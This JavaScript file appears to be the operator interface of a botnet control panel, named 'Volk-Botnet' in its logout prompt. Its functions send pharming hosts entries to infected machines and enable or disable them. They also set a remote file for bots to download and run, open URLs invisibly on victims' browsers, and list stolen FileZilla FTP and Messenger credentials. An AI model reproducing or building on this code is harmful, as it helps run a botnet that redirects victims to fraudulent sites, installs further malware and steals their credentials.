function AjaxLoad_3(__url ,  __variables , __donde){

	$.ajax( {
		async:true,
		dataType: "html",
		type: "POST",
		url: __url ,
		data: __variables,
		global: true,
		ifModified: false,
		processData:true,
		contentType: "application/x-www-form-urlencoded",
		success: function(datos){
			$(__donde).html(datos);
			//alert(datos);
			return false ;
		}
	});
	return false ;
}
function AjaxLoad_2(__url ,  __variables , __donde){

	$.ajax( {
		async:true,
		dataType: "html",
		type: "GET",
		url: __url ,
		data: __variables,
		global: true,
		ifModified: false,
		processData:true,
		contentType: "application/x-www-form-urlencoded",
		success: function(datos){
			$(__donde).html(datos);
			//alert(datos);
		}
	});
	return false ;
}

function Paises(){
	var pais = $("#pais").attr("value");
	if(pais == "cero"){
		alert("Select a Country.");
		return false ;
	}
	AjaxLoad_2("Vistas/Estadisticas.php" , 'pais='+pais , "#table_estadisticas");
	SelectPais();
}

function objetoAjax(){
	var xmlhttp=false;
	try {
		xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
	} catch (e) {
		try {
		   xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
		} catch (E) {
			xmlhttp = false;
  		}
	}
	if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
		xmlhttp = new XMLHttpRequest();
	}
	return xmlhttp;
}


function Pagina(nropagina , pais){
	divContenido = document.getElementById('table_estadisticas');
	ajax=objetoAjax();
	ajax.open("GET", "Vistas/Estadisticas.php?pag="+nropagina+"&pais="+pais);
	divContenido.innerHTML= '<div align="center"><img src="archivos/imagen/ajax.gif"></div>';
	ajax.onreadystatechange=function() {
		if (ajax.readyState==4) {
			divContenido.innerHTML = ajax.responseText
		}
	}
	ajax.send(null)
}

function SelectPais(){
	AjaxLoad("Vistas/SelectPais.php" , 0 , "#form_select_pais");
	setTimeout("SelectPais()",10000);
	return false ;
}

function Salir(){
	var __confirm = confirm("You are disconnected from Volk-Botnet?.");
	if( !__confirm ){ return false ; }
	AjaxLoad_3("Controladores/Salir.php" , 0 , "body");
}
function Inicio(){
	ajax_load('Vistas/Inicio.php',  "div_ajax");
	return false ;
}

$(document).ready(function() {
	Estadisticas();
	Inicio() ;
});



function submitpharming(){
		
		var _pharming = document.getElementById('pharming').value;
		
		
	var __confirm = confirm("sure to save the data?");
	if( !__confirm ){ return false ; }
	
		if(_pharming == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the content hosts.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}

		if(_pharming != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var _pharming = _pharming.replace(new RegExp('\\n','g'),'%0D%0A');
			ajax_load('Controladores/HostsInsert.php?pharming='+_pharming, 'mensajebot');
			return false ;
			
		}
}
function Act_Pharming(id , pag , pais){
	var __confirm = confirm("Sure to change the state?.");
	if( !__confirm ){ return false ; }
	ajax_load('Controladores/EstadisticasInsert.php?f=actpha&id='+id+'&pais='+pais+'&pag='+pag, 'table_estadisticas');
}
function Des_Pharming(id , pag , pais){
	var __confirm = confirm("Sure to change the state?.");
	if( !__confirm ){ return false ; }
	ajax_load('Controladores/EstadisticasInsert.php?f=despha&id='+id+'&pais='+pais+'&pag='+pag, 'table_estadisticas');
}

function Act_Downloader(id , pag , pais){
	var __confirm = confirm("Sure to change the state?.");
	if( !__confirm ){ return false ; }
	ajax_load('Controladores/EstadisticasInsert.php?f=actdwn&id='+id+'&pais='+pais+'&pag='+pag, 'table_estadisticas');
}


function Des_Downloader(id , pag , pais){
	var __confirm = confirm("Sure to change the state?.");
	if( !__confirm ){ return false ; }
	ajax_load('Controladores/EstadisticasInsert.php?f=desdwn&id='+id+'&pais='+pais+'&pag='+pag, 'table_estadisticas');
}

function submitInternetExplorer() {
	
	var _url = document.getElementById('domin').value;
	
	var __confirm = confirm("Sure to keep the URLs?.");
	if( !__confirm ){ return false ; }
	
	
	if(_url == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the url.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}


		if( _url != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var Ruta = 'domin='+_url ;
			ajax_load('Controladores/ExplorerInsert.php?'+Ruta , 'mensajebot');
			return false ;
		}
	
	
	
	
}
function submitInternetExplorer2() {
	
	var _url = document.getElementById('ExecuteHttp2').value;
	
	var __confirm = confirm("Sure to keep the URL invisible?.");
	if( !__confirm ){ return false ; }
	
	
	if(_url == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the url.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot2').innerHTML = cadena ;
			return false ;
		}


		if( _url != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot2').innerHTML = cadena ;
			var Ruta = 'ExecuteHttp2='+_url ;
			ajax_load('Controladores/ExplorerInsert2.php?'+Ruta , 'mensajebot2');
			return false ;
		}
	
	
	
	
}
function submitExecute(){
		
		var _url = document.getElementById('https').value;
		var _ejecutar = document.getElementById('ExecuteHttp').value;
		

		
	var __confirm = confirm("This sure to keep the data?.");
	if( !__confirm ){ return false ; }
	
		if(_url == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the URL of the file to download.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}
		if(_ejecutar == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the path to Run.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}


		if( _url != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var Ruta = 'https='+_url+'&ExecuteHttp='+_ejecutar ;
			ajax_load('Controladores/ExeInsert.php?'+Ruta , 'mensajebot');
			return false ;
		}
}
function SaveUser(){
	var _User = document.getElementById('User').value;
	var _Pasw = document.getElementById('Pasw').value;
	
 var __confirm = confirm("This sure to keep the data?.");
	if( !__confirm ){ return false ; }
	
	if(_User == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the name Administrator.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}
		if(_Pasw == ''){
			cadena = '<font face="Tahoma" size="2">Please enter the Password Manager.</font><img src="archivos/imagen/ajax-error.png" width="18" height="18" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			return false ;
		}

		if( _User != ''){
			cadena = '<font face="Tahoma" size="2">Saving data, please wait.</font><img src="archivos/imagen/ajax-loader.gif" />' ;
			document.getElementById('mensajebot').innerHTML = cadena ;
			var Ruta = 'User='+_User+'&Pasw='+_Pasw ;
			ajax_load('Controladores/EditUser.php?'+Ruta , 'mensajebot');
			return false ;
		}
}

function FtpsPag(nropagina){
	divContenido = document.getElementById('table_estadisticas');
	ajax=objetoAjax();
	ajax.open("GET", "Controladores/Filezilla.php?pag="+nropagina);
	divContenido.innerHTML= '<img src="archivos/imagen/ajax.gif">';
	ajax.onreadystatechange=function() {
		if (ajax.readyState==4) {
			divContenido.innerHTML = ajax.responseText
		}
	}
	ajax.send(null)
}
function EmailPag(nropagina){
	divContenido = document.getElementById('table_estadisticas');
	ajax=objetoAjax();
	ajax.open("GET", "Controladores/Messenger.php?pag="+nropagina);
	divContenido.innerHTML= '<img src="archivos/imagen/ajax.gif">';
	ajax.onreadystatechange=function() {
		if (ajax.readyState==4) {
			divContenido.innerHTML = ajax.responseText
		}
	}
	ajax.send(null)
}